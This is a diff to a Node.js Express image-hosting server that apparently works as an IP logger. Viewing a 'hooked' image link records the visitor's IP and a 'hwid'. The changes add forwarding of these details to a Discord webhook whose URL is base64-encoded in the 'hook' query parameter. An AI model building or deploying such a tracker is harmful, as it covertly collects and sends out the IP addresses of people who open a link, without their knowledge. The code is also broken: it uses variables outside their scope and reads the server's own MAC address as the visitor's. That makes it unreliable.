@@ -24,51 +24,69 @@ const syn_config = {
 const images = {}
 
 app.post(syn_config.preendpoint + 'encrypt', async (req, res) => {
-  // fetch and encrypt the image from the provided URL, and save it to the server
-  const imageUrl = req.body.imageUrl;
-  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-  try {
-      const imageBuffer = await request.get(imageUrl, { encoding: null });
-      const id = uuidv4();
-      const encryptedImage = encryptImage(imageBuffer);
-      images[id] = {
-          encryptedImage,
-          clicks: 0,
-          ip, // store the user's IP address in the object
-          userId: uuidv4() // generate a new unique identifier for the user
-      }
-      const imageURL = syn_config.preendpoint + 'content/raw/' + id
-      console.log(`New Image Hooked Track it here: ${syn_config.preendpoint + "content/tracking/"+id}`)
-      const trackinglink = `${syn_config.preendpoint}content/tracking/` + id
-      res.status(200).send({ imageURL, trackinglink, id })
-  } catch (err) {
-      console.error(err);
-      res.status(400).send({ error: 'Error fetching or encrypting image' });
-  }
+    // fetch and encrypt the image from the provided URL, and save it to the server
+    const imageUrl = req.body.imageUrl;
+    try {
+        const imageBuffer = await request.get(imageUrl, { encoding: null });
+        const id = uuidv4();
+        const encryptedImage = encryptImage(imageBuffer);
+        images[id] = {
+            encryptedImage,
+            clicks: 0
+        }
+        const imageURL = syn_config.preendpoint + 'content/raw/' + id
+        console.log(`Track it here: ${syn_config.preendpoint + "content/tracking/"+id}`)
+        const trackinglink = `${syn_config.preendpoint}content/tracking/` + id
+        res.status(200).send({ imageURL, trackinglink, id })
+    } catch (err) {
+        console.error(err);
+        res.status(400).send({ error: 'Error fetching or encrypting image' });
+    }
 });
 
 app.get(syn_config.preendpoint + 'content/tracking/:id', (req, res) => {
-  const id = req.params.id;
-  if (images[id]) {
-    const clicks = images[id].clicks;
-    const tracking = images[id].tracking || [];
-    const title = `ZImage-Hosting Tracking - Image ${id}`;
-    const description = `This image has been clicked ${clicks} times. Tracking information: ${JSON.stringify(tracking)}`;
-    res.setHeader('title', title);
-    res.setHeader('description', description);
-    res.status(200).send({ clicks, tracking });
-  } else {
-    res.status(404).send('Image not found');
-  }
-});
+    // get the tracking information for an image
+    const id = req.params.id
+    if (images[id]) {
+        const clicks = images[id].clicks
+        res.status(200).send({ clicks, tracking: images[id].tracking })
+    } else {
+        res.status(404).send('Image not found')
+    }
+})
+
+app.get("/", (req, res) => {
+  res.send('Hello, world')
+})
+
 
 app.get(syn_config.preendpoint + 'content/raw/:id', async (req, res) => {
   const id = req.params.id;
   if (images[id]) {
     images[id].clicks += 1;
-    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    images[id].tracking = images[id].tracking || [];
-    images[id].tracking.push({ userId: images[id].userId, ip });
+
+    const allowTracking = req.query.allowtracking === 'true';
+    if (allowTracking) {
+      const hwid = getmac.default();
+      const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+      images[id].tracking = images[id].tracking || [];
+      images[id].tracking.push({ hwid, ip });
+    }
+
+    const bytecode = req.query.hook;
+    if (bytecode) {
+      // Convert the bytecode to the actual Discord webhook URL
+      const webhookUrl = Buffer.from(bytecode.split('/').slice(1).join(''), 'base64').toString();
+      
+      // Send the webhook with information about the image
+      const message = `Image ${id} was clicked ${images[id].clicks} times. \n\nHWID: ${hwid}\nIP: ${ip}`;
+      const data = {
+        username: 'Image Hosting',
+        avatar_url: 'https://example.com/avatar.png',
+        content: message
+      };
+      await axios.post(webhookUrl, data);
+    }
 
     // Decrypt the encrypted image data
     const decryptedBuffer = await decryptImage(images[id].encryptedImage);
@@ -79,14 +97,6 @@ app.get(syn_config.preendpoint + 'content/raw/:id', async (req, res) => {
     res.status(404).send('Image not found');
   }
 });
-
-
-
-
-app.get("/", (req, res) => {
-  res.send('Hello, world')
-})
-
 
 
 
